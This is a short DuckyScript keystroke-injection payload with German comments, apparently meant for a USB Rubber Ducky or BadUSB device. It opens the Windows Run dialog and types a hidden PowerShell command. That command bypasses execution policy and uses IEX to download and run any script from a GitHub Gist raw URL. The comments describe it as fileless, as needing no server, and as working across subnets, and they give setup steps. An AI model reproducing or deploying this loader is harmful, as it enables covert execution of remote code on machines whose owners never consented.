REM  Lädt ein beliebiges PowerShell-Script direkt von einem
REM  öffentlichen GitHub Gist – fileless, kein Server nötig.
REM  Funktioniert über alle Subnetze (HTTPS zu github.com).
REM
REM  Setup: GIST_RAW_URL durch Raw-URL des eigenen Gists ersetzen
REM  Beispiel: https://gist.githubusercontent.com/USER/ID/raw/script.ps1
REM ============================================================

DELAY 2000

GUI r
DELAY 500
STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
